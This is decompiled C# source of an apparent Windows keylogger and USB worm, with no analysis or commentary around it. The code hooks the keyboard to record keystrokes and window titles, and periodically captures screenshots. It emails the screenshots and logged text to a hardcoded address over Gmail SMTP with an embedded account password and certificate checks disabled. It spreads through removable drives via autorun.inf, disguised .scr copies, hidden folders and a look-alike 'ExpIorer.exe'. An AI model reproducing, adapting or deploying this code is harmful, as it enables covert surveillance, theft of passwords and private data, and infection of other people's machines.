using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace ns0;

internal static class Class0
{
	private delegate IntPtr Delegate0(int int_0, IntPtr intptr_0, IntPtr intptr_1);

	private static string string_0 = "";

	private static Delegate0 delegate0_0 = smethod_5;

	private static IntPtr intptr_0 = IntPtr.Zero;

	public static byte byte_0 = 0;

	public static byte byte_1 = 0;

	public static byte byte_2 = 0;

	private static string string_1 = Path.GetRandomFileName();

	private static string string_2;

	private static Func<DriveInfo, bool> func_0;

	private static RemoteCertificateValidationCallback remoteCertificateValidationCallback_0;

	private static Func<Process, bool> func_1;

	[DllImport("user32.dll")]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(int int_0, StringBuilder stringBuilder_0, int int_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int int_0, Delegate0 delegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_0, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_3);

	private unsafe static void smethod_0(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[9];
		string sourceFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Service.exe");
		*(int*)ptr = 0;
		DriveInfo[] drives = DriveInfo.GetDrives();
		if (func_0 == null)
		{
			func_0 = smethod_6;
		}
		IEnumerator<DriveInfo> enumerator = drives.Where(func_0).GetEnumerator();
		try
		{
			while (true)
			{
				((byte*)ptr)[8] = (enumerator.MoveNext() ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] == 0)
				{
					break;
				}
				DriveInfo current = enumerator.Current;
				((byte*)ptr)[8] = (File.Exists(current.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe") ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] != 0)
				{
					continue;
				}
				string[] directories = Directory.GetDirectories(current.Name);
				*(int*)((byte*)ptr + 4) = 0;
				while (true)
				{
					((byte*)ptr)[8] = ((*(int*)((byte*)ptr + 4) < directories.Length) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[8] == 0)
					{
						break;
					}
					string text = directories[*(int*)((byte*)ptr + 4)];
					(*(int*)ptr)++;
					try
					{
						File.Copy(sourceFileName, text + ".scr", overwrite: true);
						((byte*)ptr)[8] = ((!File.Exists(text + ".scr")) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[8] == 0)
						{
							File.SetAttributes(text, File.GetAttributes(text) | FileAttributes.Hidden);
							break;
						}
					}
					catch
					{
						File.Copy(sourceFileName, string.Concat(current, "$Recycle.Bin.scr"), overwrite: true);
					}
					(*(int*)((byte*)ptr + 4))++;
				}
				((byte*)ptr)[8] = ((*(int*)ptr != 0) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] == 0)
				{
					File.Copy(sourceFileName, string.Concat(current, "$Recycle.Bin.scr"), overwrite: true);
				}
				try
				{
					string path = current.Name + "autorun.inf";
					StreamWriter streamWriter = new StreamWriter(path);
					streamWriter.WriteLine("[autorun]\\n");
					streamWriter.WriteLine("icon=angel.ico");
					streamWriter.WriteLine("open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("action=Run VMCLite");
					streamWriter.WriteLine("Shell\\Open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("Shell\\Open\\Default=1");
					streamWriter.WriteLine("Shell\\Explore=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("Shell\\Explore\\Command=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("[autorun]\n");
					streamWriter.Close();
					File.SetAttributes(current.Name + "autorun.inf", File.GetAttributes(current.Name + "autorun.inf") | FileAttributes.Hidden);
					current.VolumeLabel = "angel";
				}
				catch
				{
				}
				try
				{
					((byte*)ptr)[8] = ((!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"))) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[8] == 0)
					{
						File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), current.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					}
					((byte*)ptr)[8] = ((!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico"))) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[8] == 0)
					{
						File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico"), current.Name + "angel.ico", overwrite: true);
						File.SetAttributes(current.Name + "angel.ico", File.GetAttributes(current.Name + "angel.ico") | FileAttributes.Hidden);
						File.SetAttributes(current.Name + "angel.ico", File.GetAttributes(current.Name + "angel.ico") | FileAttributes.System);
					}
					Directory.CreateDirectory(current.Name + "$Recycle.Bin");
					File.SetAttributes(current.Name + "$Recycle.Bin", File.GetAttributes(current.Name + "$Recycle.Bin") | FileAttributes.Hidden);
					((byte*)ptr)[8] = ((!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"))) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[8] == 0)
					{
						File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), Path.Combine(current.Name + "$Recycle.Bin", "ExpIorer.exe"));
					}
					File.Copy(sourceFileName, Path.Combine(current.Name + "$Recycle.Bin", "service.exe"));
				}
				catch
				{
				}
			}
		}
		finally
		{
			((byte*)ptr)[8] = ((enumerator == null) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[8] == 0)
			{
				enumerator.Dispose();
			}
		}
		smethod_3(null, null);
	}

	private static void smethod_1(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall")))
		{
			File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		}
		((Image)val).Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("zibayekhofte_lover2006@yahoo.com");
		mailMessage.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
		mailMessage.Subject = Environment.UserName + " key";
		mailMessage.SubjectEncoding = Encoding.UTF8;
		mailMessage.Body = string_0;
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.High;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential("XtahmineX@gmail.com", "20morteza");
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment item = new Attachment(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		mailMessage.Attachments.Add(item);
		if (remoteCertificateValidationCallback_0 == null)
		{
			remoteCertificateValidationCallback_0 = smethod_7;
		}
		ServicePointManager.ServerCertificateValidationCallback = remoteCertificateValidationCallback_0;
		try
		{
			smtpClient.Send(mailMessage);
			string_0 = "";
		}
		catch
		{
		}
	}

	private unsafe static void Main()
	{
		void* ptr = stackalloc byte[2];
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
		folderPath = Path.Combine(folderPath, "Service.exe");
		Mutex mutex = new Mutex(initiallyOwned: true, Application.get_ProductName(), out *(bool*)ptr);
		((byte*)ptr)[1] = ((*(sbyte*)ptr == 0) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[1] == 0)
		{
			mutex.ReleaseMutex();
		}
		else
		{
			((byte*)ptr)[1] = ((Application.get_StartupPath().Length >= 10) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[1] == 0)
			{
				Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
			}
			Process.GetCurrentProcess().Kill();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath().ToString(), folderPath, overwrite: true);
			File.Copy(Application.get_ExecutablePath().ToString(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Thumbs.db"), overwrite: true);
		}
		catch
		{
		}
		((byte*)ptr)[1] = ((Application.get_StartupPath().Length >= 10) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[1] == 0)
		{
			try
			{
				Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
				((byte*)ptr)[1] = ((!File.Exists(Application.get_StartupPath() + "\\angel.ico")) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[1] == 0)
				{
					File.Copy(Application.get_StartupPath() + "\\angel.ico", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "angel.ico"), overwrite: true);
				}
				((byte*)ptr)[1] = ((!File.Exists(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe"))) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[1] == 0)
				{
					File.Copy(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), overwrite: true);
					File.Copy(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), overwrite: true);
				}
				else
				{
					((byte*)ptr)[1] = ((!File.Exists(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe")) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[1] == 0)
					{
						File.Copy(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), overwrite: true);
						File.Copy(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), overwrite: true);
					}
				}
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += smethod_1;
		timer.AutoReset = true;
		timer.Interval = 720000.0;
		timer.Start();
		System.Timers.Timer timer2 = new System.Timers.Timer();
		timer2.Elapsed += smethod_0;
		timer2.AutoReset = true;
		timer2.Interval = 3000.0;
		timer2.Start();
		System.Timers.Timer timer3 = new System.Timers.Timer();
		timer3.Elapsed += smethod_4;
		timer3.AutoReset = true;
		timer3.Interval = 1000.0;
		timer3.Start();
		intptr_0 = smethod_2(delegate0_0);
		Application.Run();
		GC.KeepAlive(timer2);
		GC.KeepAlive(timer3);
		UnhookWindowsHookEx(intptr_0);
	}

	private static IntPtr smethod_2(Delegate0 delegate0_1)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, delegate0_1, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder(256);
		num = GetForegroundWindow();
		if (GetWindowText(num, stringBuilder, 256) > 0 && string_2 != stringBuilder.ToString())
		{
			string_0 = string_0 + " (" + stringBuilder.ToString() + ")";
			string_2 = stringBuilder.ToString();
		}
	}

	private unsafe static void smethod_4(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[5];
		*(int*)ptr = 0;
		Process[] processes = Process.GetProcesses();
		if (func_1 == null)
		{
			func_1 = smethod_8;
		}
		IEnumerator<Process> enumerator = processes.Where(func_1).GetEnumerator();
		try
		{
			while (true)
			{
				((byte*)ptr)[4] = (enumerator.MoveNext() ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4] != 0)
				{
					_ = enumerator.Current;
					*(int*)ptr = 1;
					continue;
				}
				break;
			}
		}
		finally
		{
			((byte*)ptr)[4] = ((enumerator == null) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4] == 0)
			{
				enumerator.Dispose();
			}
		}
		((byte*)ptr)[4] = ((*(int*)ptr != 0) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[4] != 0)
		{
			return;
		}
		try
		{
			try
			{
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
			}
			catch
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	private static IntPtr smethod_5(int int_0, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between I4 and Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected I4, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Invalid comparison between Unknown and I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Invalid comparison between Unknown and I4
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Invalid comparison between Unknown and I4
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Invalid comparison between Unknown and I4
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Expected I4, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected I4, but got Unknown
		//IL_03de: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0402: Expected I4, but got Unknown
		//IL_0402: Unknown result type (might be due to invalid IL or missing references)
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_042a: Expected I4, but got Unknown
		//IL_042a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0430: Unknown result type (might be due to invalid IL or missing references)
		//IL_0446: Expected I4, but got Unknown
		int num;
		if (int_0 >= 0 && intptr_1 == (IntPtr)256)
		{
			num = Marshal.ReadInt32(intptr_2);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				byte_1 = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 32)
			{
				if ((int)val <= 13)
				{
					switch (val - 8)
					{
					case 0:
						goto IL_007f;
					case 1:
						goto IL_00b1;
					}
					if ((int)val != 13)
					{
						goto IL_0446;
					}
					string_0 += "Return";
				}
				else if ((int)val != 20)
				{
					if ((int)val != 32)
					{
						goto IL_0446;
					}
					string_0 += " ";
				}
				else if (byte_0 == 0)
				{
					byte_0 = 1;
				}
				else
				{
					byte_0 = 0;
				}
				goto IL_07c0;
			}
			if ((int)val <= 93)
			{
				switch (val - 48)
				{
				case 0:
					goto IL_0168;
				case 1:
					goto IL_01a7;
				case 2:
					goto IL_01e6;
				case 3:
					goto IL_0225;
				case 4:
					goto IL_0264;
				case 5:
					goto IL_02a3;
				case 6:
					goto IL_02e2;
				case 7:
					goto IL_0321;
				case 8:
					goto IL_0360;
				case 9:
					goto IL_039f;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					goto IL_07ad;
				}
			}
			else
			{
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					goto IL_07ad;
				}
				switch (val - 186)
				{
				case 0:
					goto IL_0600;
				case 1:
					goto IL_063f;
				case 2:
					goto IL_067e;
				case 3:
					goto IL_06bd;
				case 4:
					goto IL_06fc;
				case 5:
					goto IL_073b;
				case 6:
					goto IL_0774;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_0528;
				case 1:
					goto IL_0567;
				case 2:
					goto IL_0580;
				case 3:
					goto IL_05bf;
				}
			}
			goto IL_0446;
		}
		goto IL_07d0;
		IL_07ad:
		string_0 = string_0 ?? "";
		goto IL_07c0;
		IL_02e2:
		if (byte_1 == 0)
		{
			string_0 += "6";
		}
		else
		{
			string_0 += "^";
		}
		goto IL_07c0;
		IL_07c0:
		byte_1 = 0;
		string_0 = "";
		goto IL_07d0;
		IL_07d0:
		return CallNextHookEx(intptr_0, int_0, intptr_1, intptr_2);
		IL_02a3:
		if (byte_1 == 0)
		{
			string_0 += "5";
		}
		else
		{
			string_0 += "%";
		}
		goto IL_07c0;
		IL_0774:
		if (byte_1 == 0)
		{
			string_0 += "`";
		}
		else
		{
			string_0 += "~";
		}
		goto IL_07c0;
		IL_00b1:
		string_0 += "TAB";
		goto IL_07c0;
		IL_007f:
		if (string_0.Length > 1)
		{
			string_0.Substring(string_0.Length - 1, 1);
		}
		goto IL_07c0;
		IL_0225:
		if (byte_1 == 0)
		{
			string_0 += "3";
		}
		else
		{
			string_0 += "#";
		}
		goto IL_07c0;
		IL_0600:
		if (byte_1 == 0)
		{
			string_0 += ";";
		}
		else
		{
			string_0 += ":";
		}
		goto IL_07c0;
		IL_0446:
		if (byte_1 == 0 && byte_0 == 0)
		{
			string_0 += ((object)(Keys)num).ToString()!.ToLower();
		}
		if (byte_1 == 1 && byte_0 == 0)
		{
			string_0 += ((object)(Keys)num).ToString()!.ToUpper();
		}
		if (byte_1 == 0 && byte_0 == 1)
		{
			string_0 += ((object)(Keys)num).ToString()!.ToUpper();
		}
		if (byte_1 == 1 && byte_0 == 1)
		{
			string_0 += ((object)(Keys)num).ToString()!.ToLower();
		}
		goto IL_07c0;
		IL_0264:
		if (byte_1 == 0)
		{
			string_0 += "4";
		}
		else
		{
			string_0 += "$";
		}
		goto IL_07c0;
		IL_073b:
		if (byte_1 == 0)
		{
			string_0 += "/";
		}
		else
		{
			string_0 += "?";
		}
		goto IL_07c0;
		IL_01e6:
		if (byte_1 == 0)
		{
			string_0 += "2";
		}
		else
		{
			string_0 += "@";
		}
		goto IL_07c0;
		IL_067e:
		if (byte_1 == 0)
		{
			string_0 += ",";
		}
		else
		{
			string_0 += "<";
		}
		goto IL_07c0;
		IL_05bf:
		if (byte_1 == 0)
		{
			string_0 += "'";
		}
		else
		{
			string_0 += '"';
		}
		goto IL_07c0;
		IL_06fc:
		if (byte_1 == 0)
		{
			string_0 += ".";
		}
		else
		{
			string_0 += ">";
		}
		goto IL_07c0;
		IL_063f:
		if (byte_1 == 0)
		{
			string_0 += "=";
		}
		else
		{
			string_0 += "+";
		}
		goto IL_07c0;
		IL_01a7:
		if (byte_1 == 0)
		{
			string_0 += "1";
		}
		else
		{
			string_0 += "!";
		}
		goto IL_07c0;
		IL_039f:
		if (byte_1 == 0)
		{
			string_0 += "9";
		}
		else
		{
			string_0 += "(";
		}
		goto IL_07c0;
		IL_0168:
		if (byte_1 == 0)
		{
			string_0 += "0";
		}
		else
		{
			string_0 += ")";
		}
		goto IL_07c0;
		IL_06bd:
		if (byte_1 == 0)
		{
			string_0 += "-";
		}
		else
		{
			string_0 += "_";
		}
		goto IL_07c0;
		IL_0360:
		if (byte_1 == 0)
		{
			string_0 += "8";
		}
		else
		{
			string_0 += "*";
		}
		goto IL_07c0;
		IL_0580:
		if (byte_1 == 0)
		{
			string_0 += "]";
		}
		else
		{
			string_0 += "}";
		}
		goto IL_07c0;
		IL_0567:
		string_0 += "|";
		goto IL_07c0;
		IL_0321:
		if (byte_1 == 0)
		{
			string_0 += "7";
		}
		else
		{
			string_0 += "&";
		}
		goto IL_07c0;
		IL_0528:
		if (byte_1 == 0)
		{
			string_0 += "[";
		}
		else
		{
			string_0 += "{";
		}
		goto IL_07c0;
	}

	private static bool smethod_6(DriveInfo driveInfo_0)
	{
		return driveInfo_0.IsReady && driveInfo_0.DriveType.ToString() == "Removable" && driveInfo_0.ToString() != "A:\\" && driveInfo_0.ToString() != "B:\\";
	}

	private static bool smethod_7(object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
	{
		return true;
	}

	private static bool smethod_8(Process process_0)
	{
		return process_0.ToString() == "System.Diagnostics.Process (ExpIorer)";
	}
}
